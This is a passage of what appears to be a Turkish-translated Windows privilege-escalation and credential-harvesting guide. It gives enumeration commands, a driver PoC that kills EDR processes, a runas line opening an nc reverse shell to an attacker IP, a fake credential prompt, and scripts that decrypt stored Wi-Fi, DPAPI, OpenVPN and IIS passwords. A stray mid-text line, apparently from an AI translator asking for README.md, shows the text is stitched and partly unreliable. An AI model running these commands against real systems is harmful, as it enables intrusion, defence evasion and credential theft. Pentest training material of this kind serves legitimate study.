accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry veya binary'lerin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Aşağıdaki sayfayı** ilginç **autoruns locations to escalate privileges** hakkında daha fazla bilgi edinmek için okuyun:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası üçüncü taraf şüpheli/zafiyetli sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver arbitrary kernel read/write primitive açığa çıkarıyorsa (kötü tasarlanmış IOCTL handler'larında yaygın), kernel belleğinden doğrudan bir SYSTEM token çalarak yükseltebilirsiniz. Adım adım teknik burada:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Race-condition hatalarında, kırılgan çağrı saldırgan kontrollü bir Object Manager yolunu açıyorsa, lookup'u kasıtlı olarak yavaşlatmak (maksimum uzunlukta bileşenler veya derin dizin zincirleri kullanmak) pencereyi mikrosaniyelerden onlarca mikrosaniyeye uzatabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive bellek bozulması primitives

Modern hive zafiyetleri, deterministik düzenler oluşturmanıza, yazılabilir HKLM/HKU alt öğelerini kötüye kullanmanıza ve metadata bozulmasını özel bir driver olmadan kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Zincirin tamamını burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### DEVICE OBJECT'larda FILE_DEVICE_SECURE_OPEN eksikliğinin kötüye kullanılması (LPE + EDR kill)

Bazı imzalı üçüncü taraf sürücüler device object'ını güçlü bir SDDL ile IoCreateDeviceSecure üzerinden oluşturur ama DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'u ayarlamayı unuturlar. Bu bayrak olmadan, secure DACL cihaz ekstra bir bileşen içeren bir yol üzerinden açıldığında uygulanmaz; böylece herhangi bir ayrıcalıksız kullanıcı şu gibi bir namespace yolu kullanarak bir handle elde edebilir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Bir kullanıcı cihazı açabildiğinde, sürücü tarafından açığa çıkarılan ayrıcalıklı IOCTL'lar LPE ve tahrifat için kötüye kullanılabilir. Gerçekte gözlemlenen örnek yetenekler:
- Rastgele süreçlere tam erişimli handle'lar döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlanmamış raw disk read/write (offline tahrifat, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil olmak üzere herhangi bir süreci sonlandırma; bu, kernel üzerinden user land'den AV/EDR kill'e izin verir.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için mitigasyonlar
- DACL ile kısıtlanması amaçlanan device objects oluştururken her zaman FILE_DEVICE_SECURE_OPEN kullanın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırılmasına veya handle iadesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'ı (access masks, METHOD_*, input validation) sınırlayın ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunucular için tespit fikirleri
- Şüpheli device names (e.g., \\ .\\amsdk*) için user-mode açılışlarını ve suistimali gösteren belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/engelleme listelerinizi yönetin.


## PATH DLL Hijacking

Eğer **write permissions inside a folder present on PATH**'a sahipseniz, bir process tarafından yüklenen bir DLL'i hijack edebilir ve **escalate privileges** elde edebilirsiniz.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file içinde gömülü olan diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Dışarıdan **restricted services** olup olmadığını kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(list rules, create rules, turn off, turn off...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
İkili `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir

Eğer root user elde ederseniz, herhangi bir portu dinleyebilirsiniz (ilk kez `nc.exe` ile bir portu dinlemek istediğinizde GUI üzerinden `nc`'nin firewall tarafından izin verilip verilmeyeceğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe keşfedebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The **Windows Vault**, **Windows**'ın kullanıcıları otomatik olarak oturum açtırabileceği sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini depolar. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini saklayıp tarayıcılar aracılığıyla otomatik olarak oturum açtıkları izlenimini verebilir. Ancak durum böyle değildir.

Windows Vault, **Windows**'ın kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar; bu da herhangi bir **Windows uygulamasının, bir kaynağa erişmek için kimlik bilgisine ihtiyaç duyan** (sunucu veya bir web sitesi) **bu Credential Manager'dan yararlanabileceği** ve kullanıcıların sürekli kullanıcı adı ve şifre girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmedikçe, belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün görünmüyor. Bu yüzden, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini **credential manager ile iletişim kurup talep etmesi** gerekir.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Sonra, kaydedilmiş kimlik bilgilerini kullanmak için `/savecred` seçenekleriyle `runas` kullanabilirsiniz. Aşağıdaki örnek bir SMB paylaşımı üzerinden uzak bir binary çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Not: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Veri Koruma API'si (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar; özellikle Windows işletim sisteminde asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli katkı sağlayan bir kullanıcı veya sistem sırrını kullanır.

**DPAPI, kullanıcı giriş sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesine olanak tanır**. Sistem şifrelemesi içeren durumlarda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanır; burada `{SID}`, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değeridir. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada birlikte bulunur**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriklerinin CMD'de `dir` komutuyla listelenmesine izin verilmediğini, ancak PowerShell ile listelenebileceğini not etmek önemlidir).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanarak bunun şifresini çözebilirsiniz.

**credentials files protected by the master password** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak **decrypt** yapabilirsiniz.\
`sekurlsa::dpapi` modülü ile **memory**'den birçok **DPAPI** **masterkeys** çıkarabilirsiniz (eğer root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell credentials** genellikle **scripting** ve otomasyon görevlerinde şifrelenmiş kimlik bilgilerini rahatça saklama yöntemi olarak kullanılır. Bu kimlik bilgileri **DPAPI** ile korunur; bu da genellikle oluşturuldukları aynı bilgisayarda aynı kullanıcı tarafından yalnızca **decrypt** edilebilecekleri anlamına gelir.

İçinde bulunduğu dosyadan bir PS credentials'ı **decrypt** etmek için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Şu konumlarda bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son çalıştırılan komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak herhangi bir .rdg dosyasını **deşifre edin**\
Bellekten birçok **DPAPI masterkey**'i **Mimikatz** `sekurlsa::dpapi` modülü ile çıkarabilirsiniz

### Sticky Notes

Kullanıcılar genellikle StickyNotes uygulamasını Windows iş istasyonlarında, bunun bir veritabanı dosyası olduğunu fark etmeden **parolaları** ve diğer bilgileri kaydetmek için kullanırlar. Bu dosya şu konumdadır: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ve her zaman aranması ve incelenmesi gerekir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity seviyesinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **credentials** yapılandırılmış olabilir ve **recovered** edilebilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'tan çıkarılmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`'nin var olup olmadığını kontrol edin.\
Yükleyiciler **SYSTEM privileges ile çalıştırılır**, birçoğu **DLL Sideloading (Bilgi için** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH anahtarları kayıt defterinde

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanmış olabilir; bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer bu yolun içinde herhangi bir kayıt bulursanız muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca deşifre edilebilir.\
Bu teknik hakkında daha fazla bilgi için: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve sistem açılışında otomatik başlamasını istiyorsanız, şu komutu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Bu teknik artık geçerli değil gibi görünüyor. Bazı ssh anahtarları oluşturup `ssh-add` ile eklemeyi ve bir makineye ssh ile bağlanmayı denedim. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon asimetrik anahtar doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları ayrıca **metasploit** kullanarak arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Adı **SiteList.xml** olan bir dosyayı ara

### Önbelleğe Alınmış GPP Parolası

Önceden, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel local administrator hesaplarının dağıtılmasına izin veren bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. Birincisi, SYSVOL'de XML dosyaları olarak saklanan Group Policy Objects (GPOs), herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP'lerdeki parolalar, kamuya belgelenmiş bir varsayılan anahtar kullanılarak AES256 ile şifreleniyordu ve herhangi bir kimlikli kullanıcı tarafından çözülebiliyordu. Bu durum ciddi bir risk oluşturuyordu; çünkü kullanıcıların yetki yükseltmesine yol açabilirdi.

Bu riski azaltmak için, boş olmayan "cpassword" alanı içeren yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda fonksiyon parolayı çözüyor ve özel bir PowerShell nesnesi döndürüyor. Bu nesne, GPP hakkında ve dosyanın konumu hakkında bilgiler içerir ve bu güvenlik açığının tespit ve giderilmesine yardımcı olur.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista'dan önce)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'i çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials isteyin

Eğer kullanıcının onları bilebileceğini düşünüyorsanız, her zaman **kullanıcıdan kendi credentials'ını veya hatta başka bir kullanıcının credentials'ını girmesini isteyebilirsiniz** (doğrudan client'tan **credentials** istemek gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir süre önce **passwords**'ı **clear-text** veya **Base64** olarak içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Bu dosyalara doğrudan erişimim yok. README.md içeriğini buraya yapıştırır mısınız veya çevirmemi istediğiniz dosyaları tek tek listeler misiniz? Verilen kurallara uygun (kod, tag, link vs. çevrilmeden) çeviriyi yapacağım.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusundaki Kimlik Bilgileri

İçinde kimlik bilgileri olup olmadığını görmek için Geri Dönüşüm Kutusunu da kontrol etmelisiniz

Birkaç program tarafından kaydedilen **şifreleri kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt Defteri İçinde

**Kimlik bilgileri içerebilecek diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry'den openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

